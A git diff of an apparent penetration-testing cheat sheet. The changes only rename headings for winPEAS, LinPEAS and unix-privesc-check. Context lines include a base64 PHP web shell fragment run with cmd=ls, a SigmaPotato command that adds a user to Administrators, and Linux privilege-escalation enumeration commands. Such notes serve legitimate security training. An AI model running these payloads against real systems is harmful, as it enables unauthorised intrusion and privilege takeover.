@@ -831,7 +831,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
 - Shell history  
   `(Get-PSReadlineOption).HistorySavePath`  
-- 🖥️ **Auotmated Enumeration - winPEASx64.exe**  
+- 🖥️ **Automated Windows Enumeration - winPEASx64.exe**  
   - Download winPEAS to target and execute  
     ```
     #kali
@@ -961,7 +961,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - `.\SigmaPotato "net localgroup Administrators dave4 /add"`  
 
 # Linux priviledge  
-- 🖥️ **Automated Tool - LinPEAS.sh**
+- 🖥️ **Automated Linux Enum - LinPEAS.sh**
   - https://osintteam.blog/practical-guide-to-using-linpeas-for-linux-privilege-escalation-a7c753dd5293
   - transfer linpeas.sh and execute
     ```
@@ -994,7 +994,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     List cron jobs: `ls -lah /etc/cron*` `crontab -l` `sudo crontab -l //root`  
     List writable directories: `find / -writable -type d 2>/dev/null` `find / -writable -type f 2>/dev/null`    
     setuid, segid: `find / -perm -u=s -type f 2>/dev/null`    
-  - 🖥️ **Automated Tool - unix-privesc-check**
+  - 🖥️ **Automated PrivCheck - unix-privesc-check**
     - Download from https://pentestmonkey.net/tools/audit/unix-privesc-check  
     - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check <user>@<target>:/home/joe`  
     - `joe@debian-privesc:~$ ./unix-privesc-check standard > unix-privesc-check.txt`  
